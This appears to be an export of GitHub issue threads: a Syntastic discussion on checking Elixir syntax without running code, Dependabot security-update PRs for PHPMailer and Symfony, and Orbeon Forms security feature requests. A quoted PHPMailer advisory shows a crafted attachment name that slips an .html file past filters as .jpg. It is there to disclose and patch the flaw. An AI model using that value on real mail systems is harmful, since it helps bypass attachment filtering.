Not at all, other checkers already do that, f.i. `erlang/escript` and `python/python`.  Still, I'd prefer the script to do error checking and exit 0 if everything went fine, or 1 if it run into abnormal conditions (I/O errors, exceptions, whatever).

Reading [this post](https://github.com/flycheck/flycheck/issues/630) which tries to do the same thing for [flycheck](https://github.com/flycheck/flycheck), the result would have many limitations compared to the existing checker, so perhaps there should be an option to switch between the ""safe"" and the ""useful"" approaches.  Than again, the existing checker has its own problems (cf. #1343), and those aren't going to be solved any time soon.

> If not, can someone point me to an example of where the script should go and how I set `makeprg` to the correct path?

The `erlang/escript` is a good exemple.  But if you write the script I can take care of the details.
@ericlathrop: One more thing: the existing checker also uses `mix`.  Can you please explain how would this come into play, keeping in mind that to me ""elixir"" is stuff that belongs in some alchemist's olde bottle?
@lcd047 Okay, I'll work on adding error checking and pushing this further along. I just started a new job so it may take a week or two. I think `mix` is a project build tool, but I haven't used it because I'm just learning elixir. I'm only on Chapter 6 of the book, so I haven't gotten to mix yet.
For me the current elixir syntax check is a problem because it compiles the files. The phoenix framework has a nice feature of doing a code reloading on runtime. On page requests it checks if there are files that need to be compiled, if there is it compiles them and loads the code before it serves the request. But when i save the file with vim the syntax check compiles the file, which causes phoenix not to pick it up.
@lcd047 mix is the Elixir build tool and task runner, it is part of the standard library/distribution.
For those new to the thread, a summary:
1. To enable the built-in Elixir checker you need both `let g:syntastic_elixir_checkers = ['elixir']` and `let g:syntastic_enable_elixir_checker = 1`.
2. The existing elixir checker [here in syntastic](https://github.com/scrooloose/syntastic/blob/4708cdd/syntax_checkers/elixir/elixir.vim#L32) goes looking for a `mix.exs` file (indicating a mix project) and then either runs `elixir __.ex` or `mix compile mix.exs`.
3. If you set `let g:syntastic_elixir_elixir_args = '+elixirc'` you'll get behavior equivalent to `elixirc __.ex` (and `mix compile +elixirc mix.exs` won't complain).
4. All these commands execute some code, not just ""compile"" it.
5. Several write lots of files locally.
6. Furthermore, the error formats [are subject to change](https://github.com/elixir-lang/elixir/blob/f240f45ed6072c50a559c46a19f3732623f09851/lib/elixir/lib/exception.ex#L10)  and not parsed ideally yet.

It sounds to me like leaving it disabled by default is still the right thing.  :(

And we could use a tool which was safe to run and provided an easier-to-parse output.  Have @ericlathrop (how's the new job?) or @mattly (who filed https://github.com/elixir-lang/elixir/issues/3282) had any luck with anything yet? :)
I've had a lot going on in my life lately, and have been doing a lot of learning and working with Clojure for $dayjob, and haven't had time to pursue this beyond this example I posted to flycheck/flycheck#630 :

``` sh
elixir -e 'r = System.argv |> List.first |> File.read! |> Code.string_to_quoted; if elem(r, 0) == :error do IO.inspect(elem(r,1)); end' -- filename.ex
```
That's similar to what I'm doing in my linter project, and it works quite nicely.
@lpil I presume you're referring to [dogma](https://github.com/lpil/dogma).  Then perhaps the solution is to add a checker for `dogma`, and leave the `elixir` checker as it is?
That's the one :)

While I intend to make a syntastic compatible formatter, I think we still need a plain Elixir checker for the following reasons:
- Dogma is still in alpha. I'm likely going to break the API repeatedly before v1.0.0, and there are several problems that I don't know how to solve yet.
- Dogma lints style as well as correctness, and is probably far too opinionated to be used as the default syntactic Elixir linter.  Think more JSCS than jshint.
@nathanl  `.()` is a syntax for executing functions inside `IEX` and it will run when called or when you try to compile a script (.exs). Try to play with it as a module instead. Just tested syntastic (on a `mix` project) here with a very long calculation and just syntax was checked. Really cool.

But keep in mind that, since complier is not running, you may have warnings on variables (especially when using `patter matching`), that will broke your code when fixed.

Couldn't find any problems using syntastic so far. 
That's not correct, it is the syntax for calling an anonymous function. The syntax in iex is the same as anywhere else.

What problems with pattern matching have you encountered? There should be no difference.
Does this issue still exist?Yes. Syntastic currently compiles (and thus executes) Elixir code in order to check the syntax.

A safer and more performant solution would be to check the syntax with the Elixir parser, which is distributed with the language.**Update** Dogma is deprecated and syntax checking is now built-in:

`mix format --dry-run {{filename}}`Hiya. As the creator of dogma I'd recommend switching to what @steakknife suggests, dogma is deprecated and the current approach to checking syntax is unsafe.Great.  Now, in order for this to actually happen, one of you guys can either post a PR, or explain for the non-initiated (i.e. for yours truly):

* how syntastic can check that the installed elixir version supports the new options
* how checking the current file is supposed to happen, and
* what parts of the existing baggage can be discarded.

Posting some test files producing representative error messages would be nice, too.Formatting is considered correct or incorrect on an entire file basis, so no error messages will be given. It's similar to gofmt, rust-format, etc in this respect.

This was introduced in Elixir 1.6, though rather than booting the VM to check this I would instead run the command above and check for whether it wasn't recognised by checking the exit status and the content of stderr. This will be faster as you don't need to boot the VM twice.

Given the entire ecosystem is now using the formatter I'd probably not worry about older versions that do not have it.Well, I suppose this leaves the other option.  Working PRs are welcome.@lpil 1.6+ [looks right](https://hashrocket.com/blog/posts/format-your-elixir-code-now). Here's a script based on suggestions. Verified that error output is always on stderr.

```Elixir
#!/usr/bin/env elixir
if Version.match?(System.version(), "">=1.6.0"") do
  Mix.State.start_link(nil)
  Mix.ProjectStack.start_link(nil)
  Mix.Tasks.Format.run(System.argv() ++ [""--dry-run""])
else
  :erlang.error(""Upgrade elixir to 1.6+ to enable vim-syntastic syntax checking"")
end
```

TGIF and awesome Labor Day weekend depending",no,"security,"
opencats/OpenCATS,922936033,"[Security] Bump phpmailer/phpmailer from 6.0.7 to 6.5.0","Bumps [phpmailer/phpmailer](https://github.com/PHPMailer/PHPMailer) from 6.0.7 to 6.5.0. **This update includes security fixes.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/FriendsOfPHP/security-advisories/blob/master/phpmailer/phpmailer/CVE-2021-3603.yaml"">The PHP Security Advisories Database</a>.</em></p>
<blockquote>
<p><strong>Untrusted code may be run from an overridden address validator</strong></p>
<p>Affected versions: &lt;6.5.0</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/FriendsOfPHP/security-advisories/blob/master/phpmailer/phpmailer/CVE-2021-34551.yaml"">The PHP Security Advisories Database</a>.</em></p>
<blockquote>
<p><strong>RCE affecting Windows hosts via UNC paths to translation files</strong></p>
<p>Affected versions: &lt;6.5.0</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-f7hx-fqxw-rvvj"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Insufficient output escaping of attachment names in PHPMailer</strong></p>
<h3>Impact</h3>
<p>CWE-116: Incorrect output escaping.</p>
<p>An attachment added like this (note the double quote within the attachment name, which is entirely valid):</p>
<pre><code>$mail-&amp;gt;addAttachment('/tmp/attachment.tmp', 'filename.html&quot;;.jpg');
</code></pre>
<p>Will result in a message containing these headers:</p>
<pre><code>Content-Type: application/octet-stream; name=&quot;filename.html&quot;;.jpg&quot;
Content-Disposition: attachment; filename=&quot;filename.html&quot;;.jpg&quot;
</code></pre>
<p>The attachment will be named <code>filename.html</code>, and the trailing <code>&quot;;.jpg&quot;</code> will be ignored. Mail filters that reject <code>.html</code> attachments but permit <code>.jpg</code> attachments may be fooled by this.</p>
<p>Note that the MIME type itself is obtained automatically from the <em>source filename</em> (in this case <code>attachment.tmp</code>, which maps to a generic <code>application/octet-stream</code> type), and not the <em>name</em> given to the attachment (though these are the same if a separate name is not provided), though it can be set explicitly in other parameters to attachment methods.</p>
<h3>Patches</h3>
<p>Patched in PHPMailer 6.1.6 by escaping double quotes within the name using a backslash, as per RFC822 section 3.4.1, resulting in correctly escaped headers like this:</p>
<pre><code>Content-Type: application/octet-stream; name=&quot;filename.html\&quot;;.jpg&quot;
</code></pre>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
<blockquote>
<p>Affected versions: &lt; 6.1.6</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/PHPMailer/PHPMailer/releases"">phpmailer/phpmailer's releases</a>.</em></p>
<blockquote>
<h2>PHPMailer 6.5.0</h2>
<p>This is a security release.</p>
<ul>
<li><strong>SECURITY</strong> Fixes CVE-2021-34551, a complex RCE affecting Windows hosts. See <a href=""https://github.com/PHPMailer/PHPMailer/blob/HEAD/SECURITY.md"">https://github.com/PHPMailer/PHPMailer/blob/HEAD/SECURITY.md</a> for details.</li>
<li>The fix for this issue changes the way that language files are loaded. While they remain in the same PHP-like format, they are processed as plain text, and any code in them will not be run, including operations such as concatenation using the <code>.</code> operator.</li>
<li><em>Deprecation</em> The current translation file format using PHP arrays is now deprecated; the next major version will introduce a new format.</li>
<li><strong>SECURITY</strong> Fixes CVE-2021-3603 that may permit untrusted code to be run from an address validator. See <a href=""https://github.com/PHPMailer/PHPMailer/blob/HEAD/SECURITY.md"">https://github.com/PHPMailer/PHPMailer/blob/HEAD/SECURITY.md</a> for details.</li>
<li>The fix for this issue includes a minor BC break: callables injected into <code>validateAddress</code>, or indirectly through the <code>$validator</code> class property, may no longer be simple strings. If you want to inject your own validator, provide a closure instead of a function name.</li>
<li>Haraka message ID strings are now recognised</li>
</ul>
<p>Thanks to Vikrant Singh Chauhan, listensec.com, and the WordPress security team for reporting and assistance with this release.</p>
<h2>PHPMailer 6.4.1</h2>
<p>This is a security release.</p>
<ul>
<li><strong>SECURITY</strong> Fixes CVE-2020-36326, a regression of CVE-2018-19296 object injection introduced in 6.1.8, see SECURITY.md for details</li>
<li>Reject more file paths that look like URLs, matching RFC3986 spec, blocking URLS using schemes such as <code>ssh2</code></li>
<li>Ensure method signature consistency in <code>doCallback</code> calls</li>
<li>Ukrainian language update</li>
<li>Add composer scripts for checking coding standards and running tests</li>
</ul>
<p>Thanks to Fariskhi Vidyan for the report and assistance, and Tidelift for support.</p>
<h2>PHPMailer 6.4.0</h2>
<p>This is a maintenance release. The changes introduced in 6.3.0 for setting an envelope sender automatically when using <code>mail()</code> caused problems, <a href=""https://core.trac.wordpress.org/ticket/52822"">especially in WordPress</a>, so this change has been reverted. It gets a minor version bump as it's a change in behaviour, but only back to what 6.2.0 did. See <a href=""https://github-redirect.dependabot.com/PHPMailer/PHPMailer/issues/2298"">#2298</a> for more info.</p>
<p>Other changes:</p>
<ul>
<li>Check for the mbstring extension before decoding addresss in <code>parseAddress</code>, so it won't fail if you don't have it installed</li>
<li>Add Serbian Latin translation (<code>sr_latn</code>)</li>
<li>Enrol PHPMailer in <a href=""https://tidelift.com"">Tidelift</a>, because supporting open-source is important!</li>
</ul>
<h2>PHPMailer 6.3.0</h2>
<p>This is a maintenance release.</p>
<ul>
<li>Handle early connection errors such as 421 during connection and EHLO states</li>
<li>Switch to Github Actions for CI</li>
<li>Generate debug output for <code>mail()</code>, sendmail, and qmail transports. Enable using the same mechanism as for SMTP: set <code>SMTPDebug</code> &gt; 0</li>
<li>Make the <code>mail()</code> and sendmail transports set the envelope sender the same way as SMTP does, i.e. use whatever <code>From</code> is set to, only falling back to the <code>sendmail_from</code> php.ini setting if <code>From</code> is unset. This avoids errors from the <code>mail()</code> function if <code>Sender</code> is not set explicitly and php.ini is not configured. This is a minor functionality change, so bumps the minor version number.</li>
<li>Extend <code>parseAddresses</code> to decode encoded names, improve tests</li>
</ul>
<h2>PHPMailer 6.2.0</h2>
<p>This is a maintenance release. With this release, PHPMailer gains official PHP 8 compatibility; earlier versions worked in PHP 8 pre-releases, but the test suite did not. The considerable rework this required (which also restored tests running on older PHP versions) was done by <a href=""https://github.com/jrfnl""><code>@â€‹jrfnl</code></a> â€“ thank you very much!</p>
<ul>
<li>PHP 8.0 compatibility</li>
<li>Switch from PHP CS Fixer to PHP CodeSniffer for coding standards</li>
<li>Create class constants for the debug levels in the POP3 class</li>
<li>Improve French, Slovenian, and Ukrainian translations</li>
<li>Improve file upload examples so file extensions are retained</li>
<li>Resolve PHP 8 line break issues due to a very old PHP bug being fixed</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/PHPMailer/PHPMailer/blob/master/changelog.md"">phpmailer/phpmailer's changelog</a>.</em></p>
<blockquote>
<h2>Version 6.5.0 (June 16th, 2021)</h2>
<ul>
<li><strong>SECURITY</strong> Fixes CVE-2021-34551, a complex RCE affecting Windows hosts. See <a href=""https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md"">https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md</a> for details.</li>
<li>The fix for this issue changes the way that language files are loaded. While they remain in the same PHP-like format, they are processed as plain text, and any code in them will not be run, including operations such as concatenation using the <code>.</code> operator.</li>
<li><em>Deprecation</em> The current translation file format using PHP arrays is now deprecated; the next major version will introduce a new format.</li>
<li><strong>SECURITY</strong> Fixes CVE-2021-3603 that may permit untrusted code to be run from an address validator. See <a href=""https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md"">https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md</a> for details.</li>
<li>The fix for this issue includes a minor BC break: callables injected into <code>validateAddress</code>, or indirectly through the <code>$validator</code> class property, may no longer be simple strings. If you want to inject your own validator, provide a closure instead of a function name.</li>
<li>Haraka message ID strings are now recognised</li>
</ul>
<h2>Version 6.4.1 (April 29th, 2021)</h2>
<ul>
<li><strong>SECURITY</strong> Fixes CVE-2020-36326, a regression of CVE-2018-19296 object injection introduced in 6.1.8, see SECURITY.md for details</li>
<li>Reject more file paths that look like URLs, matching RFC3986 spec, blocking URLS using schemes such as <code>ssh2</code></li>
<li>Ensure method signature consistency in <code>doCallback</code> calls</li>
<li>Ukrainian language update</li>
<li>Add composer scripts for checking coding standards and running tests</li>
</ul>
<h2>Version 6.4.0 (March 31st, 2021)</h2>
<ul>
<li>Revert change that made the <code>mail()</code> and sendmail transports set the envelope sender if one isn't explicitly provided, as it causes problems described in <a href=""https://github-redirect.dependabot.com/PHPMailer/PHPMailer/issues/2298"">PHPMailer/PHPMailer#2298</a></li>
<li>Check for mbstring extension before decoding addresss in <code>parseAddress</code></li>
<li>Add Serbian Latin translation (<code>sr_latn</code>)</li>
<li>Enrol PHPMailer in Tidelift</li>
</ul>
<h2>Version 6.3.0 (February 19th, 2021)</h2>
<ul>
<li>Handle early connection errors such as 421 during connection and EHLO states</li>
<li>Switch to Github Actions for CI</li>
<li>Generate debug output for <code>mail()</code>, sendmail, and qmail transports. Enable using the same mechanism as for SMTP: set <code>SMTPDebug</code> &gt; 0</li>
<li>Make the <code>mail()</code> and sendmail transports set the envelope sender the same way as SMTP does, i.e. use whatever <code>From</code> is set to, only falling back to the <code>sendmail_from</code> php.ini setting if <code>From</code> is unset. This avoids errors from the <code>mail()</code> function if <code>Sender</code> is not set explicitly and php.ini is not configured. This is a minor functionality change, so bumps the minor version number.</li>
<li>Extend <code>parseAddresses</code> to decode encoded names, improve tests</li>
</ul>
<h2>Version 6.2.0</h2>
<ul>
<li>PHP 8.0 compatibility, many thanks to <a href=""https://github.com/jrf""><code>@â€‹jrf</code></a>_nl!</li>
<li>Switch from PHP CS Fixer to PHP CodeSniffer for coding standards</li>
<li>Create class constants for the debug levels in the POP3 class</li>
<li>Improve French, Slovenian, and Ukrainian translations</li>
<li>Improve file upload examples so file extensions are retained</li>
<li>Resolve PHP 8 line break issues due to a very old PHP bug being fixed</li>
<li>Avoid warnings when using old openssl functions</li>
<li>Improve Travis-CI build configuration</li>
</ul>
<h2>Version 6.1.8 (October 9th, 2020)</h2>
<ul>
<li>Mark <code>ext-hash</code> as required in composer.json. This has long been required, but now it will cause an error at install time rather than runtime, making it easier to diagnose</li>
<li>Make file upload examples safer</li>
<li>Update links to SMTP testing servers</li>
<li>Avoid errors when set_time_limit is disabled (you need better hosting!)</li>
<li>Allow overriding auth settings for local tests; makes it easy to run tests using HELO</li>
<li>Recover gracefully from errors during keepalive sessions</li>
<li>Add AVIF MIME type mapping</li>
<li>Prevent duplicate <code>To</code> headers in BCC-only messages when using <code>mail()</code></li>
<li>Avoid file function problems when attaching files from Windows UNC paths</li>
<li>Improve German, Bahasa Indonesian, Filipino translations</li>
<li>Add Javascript-based example</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/a5b5c43e50b7fba655f793ad27303cd74c57363c""><code>a5b5c43</code></a> Changelog</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/e121da364fbf25d861f8131e4c742ab875f1444e""><code>e121da3</code></a> Merge branch 'master' of <a href=""https://github.com/PHPMailer/PHPMailer"">https://github.com/PHPMailer/PHPMailer</a></li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/74e512aa750f8f9a2a927161706c5027a3aefb76""><code>74e512a</code></a> Security update</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/acd264bf17ff4ac5c915f0d4226dce8a9ea70bc3""><code>acd264b</code></a> Merge branch 'CVE-2021-34551'</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/0063f83e8ccdd46faa473c541f7dd8ba46ebc37a""><code>0063f83</code></a> Changelog</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/707205f25572332079b8c77c06a26d4ebb54d90f""><code>707205f</code></a> Changelog</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/1047838e84c8ec99c566c9a52336d9dbddd4e333""><code>1047838</code></a> Changelog</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/c2f191be6bd6ba6a62cd899a7cce409da9651a85""><code>c2f191b</code></a> Changelog</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/45f3c18dc6a2de1cb1bf49b9b249a9ee36a5f7f3""><code>45f3c18</code></a> Deny string-based callables altogether</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/6334bab2affb132b1445825a0f1f82f7869b981e""><code>6334bab</code></a> CVE docs</li>
<li>Additional commits viewable in <a href=""https://github.com/PHPMailer/PHPMailer/compare/v6.0.7...v6.5.0"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=phpmailer/phpmailer&package-manager=composer&previous-version=6.0.7&new-version=6.5.0)](https://dependabot.com/compatibility-score/?dependency-name=phpmailer/phpmailer&package-manager=composer&previous-version=6.0.7&new-version=6.5.0)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>","@dependabot rebase",yes,"dependencies,security,"
opencats/OpenCATS,522653005,"[Security] Bump symfony/dependency-injection from 2.8.11 to 2.8.52","Bumps [symfony/dependency-injection](https://github.com/symfony/dependency-injection) from 2.8.11 to 2.8.52. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>

*Sourced from [The PHP Security Advisories Database](https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/dependency-injection/CVE-2019-10910.yaml).*

> **CVE-2019-10910: Check service IDs are valid**
> 
> Affected versions: >=2.7.0, <2.7.51; >=2.8.0, <2.8.50; >=3.0.0, <3.1.0; >=3.1.0, <3.2.0; >=3.2.0, <3.3.0; >=3.3.0, <3.4.0; >=3.4.0, <3.4.26; >=4.0.0, <4.1.0; >=4.1.0, <4.1.12; >=4.2.0, <4.2.7

</details>
<details>
<summary>Commits</summary>

- [`c306198`](https://github.com/symfony/dependency-injection/commit/c306198fee8f872a8f5f031e6e4f6f83086992d8) security #cve-2019-10910 [DI] Check service IDs are valid (nicolas-grekas)
- [`a2f40df`](https://github.com/symfony/dependency-injection/commit/a2f40df187f0053bc361bcea3b27ff2b85744d9f) Bump phpunit XSD version to 5.2
- [`8b7508c`](https://github.com/symfony/dependency-injection/commit/8b7508c6af29f69426d2931466db2144d0f8105c) Skip empty proxy code
- [`bc5e7d8`](https://github.com/symfony/dependency-injection/commit/bc5e7d8b064e484d26dedcb5e8ef8cd5e0f8725b) [CS] Enforces null type hint on last position in phpDocs
- [`8421939`](https://github.com/symfony/dependency-injection/commit/84219396d1a79d149a5a9d5f71afaf48dcfde7d0) Consistently throw exceptions on a single line
- [`1607759`](https://github.com/symfony/dependency-injection/commit/16077591cd1541b6978c17160b1acff529fe7abf) minor [#28301](https://github-redirect.dependabot.com/symfony/dependency-injection/issues/28301) Fix code examples in PHPDoc (maidmaid)
- [`01b722a`](https://github.com/symfony/dependency-injection/commit/01b722a7528f99ffe6bfde1080090157a47b5e68) [DI] Fix phpdoc
- [`700bdb3`](https://github.com/symfony/dependency-injection/commit/700bdb339574dcf449f650b14312516cf3587f24) Fix code examples in PHPDoc
- [`2b41cf2`](https://github.com/symfony/dependency-injection/commit/2b41cf2ff42c504374b53347dd0ed69ed968583d) [HttpKernel] Fix inheritdocs
- [`ad2446d`](https://github.com/symfony/dependency-injection/commit/ad2446d39d11c3daaa7f147d957941a187e47357) Enable native_constant_invocation CS fixer
- Additional commits viewable in [compare view](https://github.com/symfony/dependency-injection/compare/v2.8.11...v2.8.52)
</details>
<br />

[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=symfony/dependency-injection&package-manager=composer&previous-version=2.8.11&new-version=2.8.52)](https://dependabot.com/compatibility-score.html?dependency-name=symfony/dependency-injection&package-manager=composer&previous-version=2.8.11&new-version=2.8.52)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
orbeon/orbeon-forms,174137412,"Separate Form Builder and Home page permissions","Currently, `form-builder-permissions.xml` controls:
- Form Builder
  - whether the user can create/edit/publish a form definition with a given app name
- Home page
  - whether the user has ""admin"" permissions on a form definition, which includes
    - making available/unavailable
    - pushing/pulling
    - upgrading

This also enables the ""Reindex"" button (see #2905).

Instead, we would like to have separate permissions, expressed in a consistent way:
- whether the user has CRUD access to a given form definition
  - would be like general CRUD permissions, but applied to `orbeon/builder`
  - see also #1149
- whether the user has `publish` access to the form definition
  - can apply to Form Builder and the Home page
  - could cover making available/unavailable, push/pull, and upgrading
- whether the user has a general `admin` permission (see #2905)

This is similar to #1149, but the latter was about handling the `form` permission attribute.

Might require implementing #1487.
","With #1860, we want to have per-app and global permissions configuration. This would enable setting permission for `orbeon/builder` in the properties.
",no,"Module: Form Builder,Type: RFE,Area: Security,"
orbeon/orbeon-forms,150145000,"Ability to encrypt passwords in property files","It's unclear how we can do this generally. One idea would be to provide a Java API so that users can provide their own password decryption.

[+1 from customer](https://basecamp.com/1721271/projects/5368955/messages/56630735#comment_408756928)
","[+1 from customer](https://3.basecamp.com/3600924/buckets/2825555/messages/1792781553#__recording_1887687129)

I thought @avernet had done some research on using a library to do that.One idea is to support Key Management Systems (KMS), specifically Amazon KMS and Google Cloud KMS, and we would access those systems through Tink (see [KMS support in Tink](https://github.com/google/tink/blob/master/docs/KEY-MANAGEMENT.md#key-management-systems)). [+1 from customer](https://3.basecamp.com/3600924/buckets/2192969/messages/1971791645)[+1 from customer](https://3.basecamp.com/3600924/buckets/3237397/messages/4208628234)",no,"Module: Form Builder,Type: RFE,Area: Security,"
orbeon/orbeon-forms,405460023,"FormRunnerPersistence.readFormMetadata doesn't use version","This eventually retrieves the form definition metadata, but it doesn't use the specific form definition version. This means that it uses the latest published version always. This is wrong, as permissions could be different between form definition versions.",,no,"Module: Form Runner,Area: Security,"
orbeon/orbeon-forms,435898788,"Check list of CVE provided by user","[+1 from user](http://discuss.orbeon.com/Version-2016-3-CE-Vulnerabilities-td4664531.html)","- [bcprov-jdk14 1.4](https://www.cvedetails.com/vulnerability-list/vendor_id-7637/Bouncycastle.html)
- [commons-beanutils 1.8.3](https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-33761/Apache-Commons-Beanutils.html)
- [commons-fileupload 1.2.2](https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-24746/version_id-143023/Apache-Commons-Fileupload-1.2.2.html)
- [jgroups 2.2.6](https://www.cvedetails.com/vulnerability-list/vendor_id-12875/Jgroups.html)
- [org.apache.httpcomponents 4.3.5](https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-20943/Apache-Httpclient.html)
- [org.apache.xmlgraphics 1.0](https://www.cvedetails.com/cve/CVE-2017-5661/)
- [xml-xerces 2.11.0](https://snyk.io/vuln/maven:xerces:xercesImpl)
",no,"Area: Security,"
orbeon/orbeon-forms,14284432,"Upload: use Servlet 3 API when supported","See #985 for background information.

The idea here is that the container has the ability to close the connection. But this has to be verified, at least with Tomcat.

A quick glance at Tomcat sources seems to indicate that a file upload, when [`swallowAbortedUploads`](http://tomcat.apache.org/tomcat-7.0-doc/config/context.html) is set to `false` (which is _not_ the default!), will promptly close the connection. See [`Request.java`](https://github.com/apache/tomcat/blob/7f616f97067b8e3461f8611f9d26f0b262c4351f/java/org/apache/catalina/connector/Request.java#L768) as a starting point.

In short:
- using Tomcat 7
- with `swallowAbortedUploads` is set to `false`
- and Orbeon Forms using the Servlet 3 upload API

would be an improvement over the current situation, where the connection cannot be closed.

Drawbacks:
- support for pre-Servlet 3 containers
- does not resolve handling non multipart large request bodies (like a POST to a service)
","Servlet 3.0 API is no longer an issue as it is now many years old and widely supported.",no,"Module: XForms,Area: Security,Area: Performance,"
orbeon/orbeon-forms,180347586,"Support easy built-in user/authentication management","One option would be, for Orbeon Forms PE only, we could possibly bundle [Keycloak](http://www.keycloak.org/). This is probably not the only option. This could have a lot of value for some PE customers.

[+1 from evaluator](https://mail.google.com/mail/u/0/#inbox/15778615a458c81f)
","I saw this mentioned on the mailing list. I would love to see something like this bundled with PE. Currently we are using Liferay to provide registration and access to a form, but it is significantly more powerful than we need. I took a quick glance at KeyCloak and it looked more along the lines of a CAS replacement than a lightweight user management system.
@acspike Have you seen any other system? KeyCloak looked pretty good to us, but we haven't investigated in details yet. What would you consider an alternative if anything? Something built into Orbeon Forms proper?
I haven't seen anything else. I tried to look into Spring and Shiro a little bit. But to be honest, most of the words don't make sense to me when I read about products in the Java ecosystem.

I'm very thankful that you or Alessandro suggested Liferay and it has been working. But I live in fear because it is a complicated system and they tend to break in unexpected ways. One nice thing that Liferay allows for that wouldn't necessarily be available without the full blown portal solution is exposing particular forms along with additional information or instruction.

I'll continue to read up on KeyCloak. Thanks for suggesting another option.
You are welcome! I am pretty sure that KeyCloak is more lightweight than Liferay as it is dedicated to just identity/access, while Liferay does so much more (including things lots of users don't need). Let's keep looking into this.
[+1 from Twitter](https://twitter.com/cameronelliott1/status/1140669894624600064)I am nobody to tell you where to take Orbeon, but as an outsider it seems like one of the more mature options for building chunks of web applications, and in my case I don't already have an existing auth or identity system in place, so if Orbeon had a simple tightly integrated auth package, so the whole ball of wax could be used to quickly build forms applications with user account support being very simple to do, it seems like Orbeon would be natural for even more forms based applications.
Maybe mostly everybody who looks at Orbeon already has an auth system in-place? Don't know, but for my situation, it would really make Orbeon very useful. 
